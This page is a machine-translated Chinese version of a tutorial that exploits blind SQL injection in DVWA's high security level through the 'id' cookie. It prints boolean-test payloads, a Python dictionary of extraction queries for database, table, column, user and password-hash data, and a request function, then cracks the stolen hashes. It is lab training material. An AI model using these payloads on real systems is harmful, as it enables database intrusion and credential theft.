<html>
<head>
<title>Burp Suite? No Thanks! Blind SQLi in DVWA With Python (Part 3) — StackZero</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第3部分)— StackZero</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-3-stackzero-911545003f01?source=collection_archive---------1-----------------------#2022-10-28">https://infosecwriteups.com/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-3-stackzero-911545003f01?source=collection_archive---------1-----------------------#2022-10-28</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/d0b4f6ee2401c7669c63366bb87f9c33.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OZjHlvAF5rxR0-gZOIHSFA.jpeg"/></div></div></figure><blockquote class="kb kc kd"><p id="3d01" class="ke kf kg kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">本文原载于<a class="ae ld" href="https://www.stackzero.net/blind-sql-injection-dvwa-high-python/" rel="noopener ugc nofollow" target="_blank">https://www . stack zero . net/blind-SQL-injection-dvwa-high-python/</a></p></blockquote><p id="92f7" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">嘿黑客们！<br/>在这篇文章中，我们将使用Python通过使用一个高安全级别的盲SQL注入攻击来利用<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>。</p><p id="56cc" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">您可能会从以前的文章或者您的背景中想起什么是盲目的SQL注入。<br/>无论如何，提醒一下，<strong class="kh iu"> SQL注入</strong>这是一种利用服务器输入管理不当的攻击。<br/>该缺陷允许黑客注入SQL有效载荷，这可能会使他完全控制数据库(这也取决于数据库用户权限)。</p><p id="9a97" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><strong class="kh iu">盲目SQL注入</strong>只不过是一种SQL注入攻击，攻击者看不到输出结果，但必须从应用程序行为中进行推断。</p><p id="c83e" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我知道这听起来很复杂，但事实并非如此。在这篇文章中，我将许多事情视为理所当然，所以如果你觉得这篇阅读太难，我邀请你阅读我以前的帖子。</p><h1 id="f461" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">带内SQL注入</h1><ul class=""><li id="56e8" class="mf mg it kh b ki mh km mi le mj lf mk lg ml lc mm mn mo mp bi translated"><a class="ae ld" href="https://medium.com/codex/sql-injection-what-you-need-to-know-stackzero-abc80bc1ea5e" rel="noopener"> SQL注入:您需要了解的内容</a></li><li id="e60f" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><a class="ae ld" href="https://medium.com/bugbountywriteup/learn-sql-injection-in-practice-by-hacking-vulnerable-application-stackzero-ef7931c72aec" rel="noopener">通过黑客攻击易受攻击的应用程序，在实践中学习SQL注入！</a></li><li id="6d59" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><a class="ae ld" href="https://medium.com/bugbountywriteup/how-to-hack-with-sql-injection-attacks-dvwa-low-security-stackzero-9286d7d0dfd1" rel="noopener">如何用SQL注入攻击进行黑客攻击！DVWA低安全性</a></li><li id="faa9" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/hack-with-sql-injection-attacks-dvwa-medium-security-stackzero-d4af0a9a5f9">黑客用SQL注入攻击！DVWA中等安全性</a></li><li id="c45d" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/hack-with-sql-injection-attacks-dvwa-high-security-stackzero-713638840515">黑客用SQL注入攻击！DVWA高安全性</a></li></ul><h1 id="49ce" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">盲人SQL注入</h1><ul class=""><li id="21de" class="mf mg it kh b ki mh km mi le mj lf mk lg ml lc mm mn mo mp bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/how-i-exploited-blind-sqli-without-using-any-tool-stackzero-396e831ecbdf">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第1部分)</a></li><li id="7d29" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-2-stackzero-a5c0acf431dc">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第2部分)</a></li><li id="2def" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-3-stackzero-911545003f01">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第3部分)</a></li></ul><p id="ab02" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">一如既往，我假设你正在一台<a class="ae ld" href="https://medium.com/@stackzero/how-to-install-kali-linux-on-virtualbox-in-a-few-minutes-stackzero-37fb019261cb" rel="noopener"> Kali Linux </a>机器上工作(相反，可能会有一些小的不同)。</p><p id="2017" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">在开始调整我们的脚本之前，我们需要一点侦察，所以让我们打开我们的<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>机器(像往常一样，我使用的是由<a class="ae ld" href="https://tryhackme.com/room/dvwa" rel="noopener ugc nofollow" target="_blank"> TryHackMe </a>提供的那台)。</p><p id="a347" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我也要记住你，整个系列的代码都在我的<a class="ae ld" href="https://github.com/StackZeroSec/dvwa/tree/main/blind_sqli" rel="noopener ugc nofollow" target="_blank"> GitHub库</a>里。</p><p id="1497" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我只想告诉你，我知道这不是一个容易的话题。<br/>但我也相信，获得深层知识的最佳方式是:</p><ul class=""><li id="e388" class="mf mg it kh b ki kj km kn le mv lf mw lg mx lc mm mn mo mp bi translated"><strong class="kh iu">慢慢读这篇文章和之前的文章</strong></li><li id="bc20" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><strong class="kh iu">重复我们正在做的事情，也许试图预测下一步</strong></li><li id="c8bb" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><strong class="kh iu">拿自己的实验来说！编辑代码，自己试试。</strong></li></ul><p id="c654" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这就是<strong class="kh iu">黑客心态</strong>！而让一切从容不迫，没有杂念，你的结果会很惊人！</p><h1 id="9907" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">第0步:侦察</h1><p id="67e2" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le my ks kt lf mz kw kx lg na la lb lc im bi translated">在开始之前，让我们像过去一样看一下<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a> Blind SQLi部分。</p><p id="bf25" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">因此，如果您使用的是<a class="ae ld" href="https://tryhackme.com/room/dvwa" rel="noopener ugc nofollow" target="_blank"> TryHackMe </a>机器，请配置您的VPN，然后使用以下凭证登录:</p><ul class=""><li id="2f66" class="mf mg it kh b ki kj km kn le mv lf mw lg mx lc mm mn mo mp bi translated">用户名:<strong class="kh iu">管理员</strong></li><li id="ffb3" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated">密码:<strong class="kh iu">密码</strong></li></ul><figure class="nc nd ne nf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nb"><img src="../Images/748e8ba525d6c86744455cc05abfc672.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TnXQ___qDTx-KL2cgm-FqQ.jpeg"/></div></div></figure><p id="5b5d" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">现在，您可以转到设置，将安全级别设置为高。</p><figure class="nc nd ne nf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nb"><img src="../Images/d9a23f35ca82859bf9a6c87c8b00ff97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MI4Qcgaz8E1thfe3NZSfIA.jpeg"/></div></div></figure><p id="7d10" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">将安全性设置为高之后，在编写python脚本之前，我们可以进入DVWA的盲SQL注入部分。</p><p id="a307" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们可以看到一个链接，上面写着“点击这里更改你的ID”</p><p id="47a8" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">点击这里就是结果。</p><figure class="nc nd ne nf gt ju gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/fd91aff00f1eedd013b5ab6bffd6c81d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1218/format:webp/1*n6yrhn11zVeZXXHo5CCv-Q.jpeg"/></div></figure><p id="a19a" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">在继续之前，我们需要更多关于输入表单的信息，所以让我们检查一下代码(在Firefox中右键单击+ Inspect)。</p><p id="3677" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这是我们应该在浏览器底部看到的内容:</p><figure class="nc nd ne nf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nh"><img src="../Images/af1da4bd5559a77e38f3a418e69a9ea9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*F10pj45g7B4YJGe14x5VaA.jpeg"/></div></div></figure><p id="89da" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这就是我们在这两个简单步骤后所知道的:</p><ul class=""><li id="e8a4" class="mf mg it kh b ki kj km kn le mv lf mw lg mx lc mm mn mo mp bi translated">它使用<a class="ae ld" href="https://en.wikipedia.org/wiki/POST_(HTTP)" rel="noopener ugc nofollow" target="_blank"> POST </a>方法</li><li id="e3f5" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated">它具有指向当前页面的动作</li><li id="644b" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated">它传递一个以id为名称的参数。</li></ul><p id="0030" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们很快就会发现，这并不完全是我们要找的信息，回想起来，这可能被认为是多余的。但是我们不能先验地知道，所以收集尽可能多的信息是一个好习惯。</p><p id="241b" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">现在我们可以尝试提交值<em class="kg">“1”</em>并查看结果。</p><figure class="nc nd ne nf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ni"><img src="../Images/51293413cbc6cebbef065187d45db080.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NZSYUAJTiL_pr9DU651EOQ.jpeg"/></div></div></figure><p id="8dde" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">它看起来非常类似于我们在前面的级别(中等)中看到的内容。</p><h1 id="8ccb" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">查找SQLi易受攻击的输入</h1><p id="9edd" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le my ks kt lf mz kw kx lg na la lb lc im bi translated">我喜欢<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>因为每一关都教我们新的概念，这次我们可以学到的教训是，每一个领域都可能是脆弱的，饼干也不例外。<br/>尝试查看cookie(Firefox中的SHIFT + F9 ),您应该会看到类似以下内容:</p><figure class="nc nd ne nf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nj"><img src="../Images/464d1571b4ac37745c93c693008926dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sUgRK8IM1Z4kyiJ0-ZI8yQ.jpeg"/></div></div></figure><p id="d756" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这就是应用程序检索输入id的方式，这也是我们在盲SQL注入攻击中要利用的字段。</p><h1 id="32f1" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">步骤1:测试盲SQLi漏洞</h1><p id="0775" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le my ks kt lf mz kw kx lg na la lb lc im bi translated">到了这一步，我们想测试一下这个领域是否容易受到SQL注入的攻击。<br/>第一次测试将是手动的，我们将把以下值插入到cookies中。</p><pre class="nc nd ne nf gt nk nl nm nn aw no bi"><span id="cef7" class="np li it nl b gy nq nr l ns nt">1' and 1=2 #</span></pre><p id="fc74" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们可以通过打开浏览器的cookies部分(Firefox上的SHIFT + F9 ),然后用我们的有效载荷替换这个值，如下图所示。</p><figure class="nc nd ne nf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nu"><img src="../Images/84edd1f4b43d251222aa22eb42394837.png" data-original-src="https://miro.medium.com/v2/resize:fit:1384/format:webp/1*gRCIugad41IXfFKxXmta-A.jpeg"/></div></div></figure><p id="4b99" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">此后，该页面将无错误地输出以下文本:</p><pre class="nc nd ne nf gt nk nl nm nn aw no bi"><span id="f380" class="np li it nl b gy nq nr l ns nt">User ID is MISSING from the database.</span></pre><p id="5f6c" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们可以通过插入以下有效载荷来进行反证:</p><pre class="nc nd ne nf gt nk nl nm nn aw no bi"><span id="f467" class="np li it nl b gy nq nr l ns nt">1' and 1=1 #</span></pre><p id="92c9" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">同样，我们没有错误，但这一次输出将是:</p><pre class="nc nd ne nf gt nk nl nm nn aw no bi"><span id="67bc" class="np li it nl b gy nq nr l ns nt">User ID exists in the database.</span></pre><p id="a98f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">所以很明显，我们找到了易受攻击的字段，我们可以准备python脚本来攻击应用程序(没有错误，我们可以控制布尔输出)。</p><h1 id="d5d5" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">步骤2:利用隐蔽的SQLi漏洞</h1><p id="564c" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le my ks kt lf mz kw kx lg na la lb lc im bi translated">没有那么多行代码需要编写，因为我们几乎已经完成了前两个级别的全部工作:</p><ul class=""><li id="0d21" class="mf mg it kh b ki kj km kn le mv lf mw lg mx lc mm mn mo mp bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/how-i-exploited-blind-sqli-without-using-any-tool-stackzero-396e831ecbdf">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第1部分)</a></li><li id="1cb2" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-2-stackzero-a5c0acf431dc">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第2部分)</a></li></ul><p id="505c" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">所以让我们讨论一下我们必须做的改变。</p><p id="acb8" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">特别是，所有的更改都在<em class="kg"> get_query_result </em>函数中，这里我们需要:</p><ol class=""><li id="f454" class="mf mg it kh b ki kj km kn le mv lf mw lg mx lc nv mn mo mp bi translated">用有效负载设置“id”cookie</li><li id="3c28" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc nv mn mo mp bi translated">使用GET HTTP方法发送请求(我们看到的POST只是被服务器用来设置cookie)。</li></ol><p id="2b52" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">没有更多的变化，事实上，主要方法和查询与我们在<a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/how-i-exploited-blind-sqli-without-using-any-tool-stackzero-396e831ecbdf">盲目SQL注入低安全性</a>中使用的相同。</p><p id="fe08" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">根据前面的文章，我们需要的唯一库是:</p><ul class=""><li id="3138" class="mf mg it kh b ki kj km kn le mv lf mw lg mx lc mm mn mo mp bi translated"><a class="ae ld" href="https://www.crummy.com/software/BeautifulSoup/" rel="noopener ugc nofollow" target="_blank"> BeautifulSoup </a>:负责解析HTML的库。</li><li id="9725" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><a class="ae ld" href="https://requests.readthedocs.io/en/latest/" rel="noopener ugc nofollow" target="_blank">请求</a>:帮助发送HTTP请求的库。</li></ul><p id="29d5" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">您可以通过在终端上键入以下命令来安装它们:</p><pre class="nc nd ne nf gt nk nl nm nn aw no bi"><span id="b7ea" class="np li it nl b gy nq nr l ns nt">pip install beautifulsoup4 requests</span></pre><h1 id="2bbe" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">查询词典</h1><p id="92ce" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le my ks kt lf mz kw kx lg na la lb lc im bi translated">在这种情况下，我将采取与脚本相同的方法进入<a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-2-stackzero-a5c0acf431dc">中等安全级别</a>，这样我们将把所有的查询保存在一个字典中。<br/>这是理解如何通过这一关最关键的部分，所以这里是我们的字典:</p><pre class="nc nd ne nf gt nk nl nm nn aw no bi"><span id="34b2" class="np li it nl b gy nq nr l ns nt">queries = {<br/>    "db_length": "1' AND LENGTH(DATABASE()) = {} #",<br/>    "db_name": "1' AND SUBSTRING(DATABASE(), {}, 1) = '{}' #",<br/>    "n_tables": "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_type='base table' AND table_schema='{}')='{}' #",<br/>    "tables": "1' AND SUBSTR((SELECT table_name from information_schema.tables WHERE table_type='base table' AND table_schema='{}' {} LIMIT 1),{},1)='{}' #",<br/>    "n_columns": "1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}')='{}' #",<br/>    "columns": "1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {}, 1),{},1)='{}' #",<br/>    "users": "1' AND SUBSTR((SELECT {} FROM {} LIMIT {}, 1),{},1)='{}' #",<br/>    "pwd_len": "1' AND LENGTH((SELECT {} FROM {} WHERE {}='{}'))={} #",<br/>    "pwd": "1' AND SUBSTR((SELECT {} FROM {} WHERE {}='{}' LIMIT 1), {}, 1)='{}' #"<br/>}</span></pre><p id="f8f9" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">因为我们将查询作为cookie传递，所以不需要像在第一级中那样编码hashtag。</p><h1 id="3df7" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">编辑获取查询结果函数</h1><p id="fb6b" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le my ks kt lf mz kw kx lg na la lb lc im bi translated">我们要做的最后一个重要改变是对get_query_result函数的改变，不同于我们在上一级中看到的，我们必须使用<a class="ae ld" href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods" rel="noopener ugc nofollow" target="_blank"> HTTP GET </a>请求，并将id作为cookie传递。<br/>如你所见，这非常简单:</p><pre class="nc nd ne nf gt nk nl nm nn aw no bi"><span id="c75a" class="np li it nl b gy nq nr l ns nt">def get_query_result(s, sqli_blind_url, query, *args):<br/>    try:<br/>        concrete_query = query.format(*args)<br/>        response = s.get(sqli_blind_url, cookies={"id": concrete_query})<br/>        parser = DVWASQLiResponseParser(response)<br/><br/>        return parser.check_presence("exist")<br/>    except AttributeError as e:<br/>        return False</span></pre><p id="1020" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">现在我们终于准备好运行脚本了！</p><h1 id="8810" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">第4步:运行脚本</h1><p id="fab6" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le my ks kt lf mz kw kx lg na la lb lc im bi translated">我们终于到了练习的末尾，我们需要记住的最后一件事是将cookie安全性更改为HIGH，我们可以在主函数中使用一行代码来实现这一点:</p><pre class="nc nd ne nf gt nk nl nm nn aw no bi"><span id="6645" class="np li it nl b gy nq nr l ns nt">s.security = SecurityLevel.HIGH</span></pre><p id="2056" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们完了。<br/>我们只能通过在终端上键入以下命令来运行脚本:</p><pre class="nc nd ne nf gt nk nl nm nn aw no bi"><span id="3768" class="np li it nl b gy nq nr l ns nt">python main.py</span></pre><p id="6273" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这就是结果！</p><figure class="nc nd ne nf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nw"><img src="../Images/9a05faf953f1e7f0ed7d02b5457de377.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7yI4pNvyzF-pWhT4C5PWBA.jpeg"/></div></div></figure><p id="591c" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这太神奇了，像往常一样，我们可以移动到<a class="ae ld" href="https://crackstation.net/" rel="noopener ugc nofollow" target="_blank">破解站</a>并破解检索到的<a class="ae ld" href="https://en.wikipedia.org/wiki/Hash_function" rel="noopener ugc nofollow" target="_blank">哈希</a>密码:</p><figure class="nc nd ne nf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nb"><img src="../Images/19d2d58b041adb27b8b81927562f9dd6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CvhrKV51NCdQHn_xcF44Ng.jpeg"/></div></div></figure><h1 id="8243" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">代码概述</h1><p id="2204" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le my ks kt lf mz kw kx lg na la lb lc im bi translated">就这些，但是在下结论之前，让我们看一下完整的代码:</p><figure class="nc nd ne nf gt ju"><div class="bz fp l di"><div class="nx ny l"/></div></figure><h1 id="5a33" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">结论</h1><p id="a0e0" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le my ks kt lf mz kw kx lg na la lb lc im bi translated">我们已经看到，在python中利用DVWA的盲SQL注入，从低到高的难度，并不是那么微不足道的。但是我认为这是非常有教育意义的，也许，从一开始就跟随所有的SQL注入系列，可以给攻击一个更深的知识。</p><p id="e73b" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们还看到，如果我们需要适应不同的情况，在代码组织中投入一点精力可以节省大量时间。</p><p id="f1a6" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我希望你喜欢这篇文章，如果你想看更多这样的文章，你可以关注我的博客和我的社交网站。</p><p id="d41f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">回头见！</p></div><div class="ab cl nz oa hx ob" role="separator"><span class="oc bw bk od oe of"/><span class="oc bw bk od oe of"/><span class="oc bw bk od oe"/></div><div class="im in io ip iq"><p id="abd6" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><em class="kg">你可以通过下面的链接注册，每月只需5美元就可以获得所有的媒体报道:</em></p><div class="og oh gp gr oi oj"><a href="https://medium.com/membership/@stackzero" rel="noopener follow" target="_blank"><div class="ok ab fo"><div class="ol ab om cl cj on"><h2 class="bd iu gy z fp oo fr fs op fu fw is bi translated">通过我的推荐链接加入Medium-stack zero</h2><div class="oq l"><h3 class="bd b gy z fp oo fr fs op fu fw dk translated">我们的最新报道(以及数以千计的其他报道)一经发布，您就可以立即获得。成为会员后，您将获得所有权限…</h3></div><div class="or l"><p class="bd b dl z fp oo fr fs op fu fw dk translated">medium.com</p></div></div><div class="os l"><div class="ot l ou ov ow os ox jz oj"/></div></div></a></div></div><div class="ab cl nz oa hx ob" role="separator"><span class="oc bw bk od oe of"/><span class="oc bw bk od oe of"/><span class="oc bw bk od oe"/></div><div class="im in io ip iq"><p id="890d" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><em class="kg">原载于2022年10月28日</em><a class="ae ld" href="https://www.stackzero.net/blind-sql-injection-dvwa-high-python/" rel="noopener ugc nofollow" target="_blank"><em class="kg">【https://www.stackzero.net】</em></a><em class="kg">。</em></p></div><div class="ab cl nz oa hx ob" role="separator"><span class="oc bw bk od oe of"/><span class="oc bw bk od oe of"/><span class="oc bw bk od oe"/></div><div class="im in io ip iq"><h2 id="70b8" class="np li it bd lj oy oz dn ln pa pb dp lr le pc pd lv lf pe pf lz lg pg ph md pi bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae ld" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>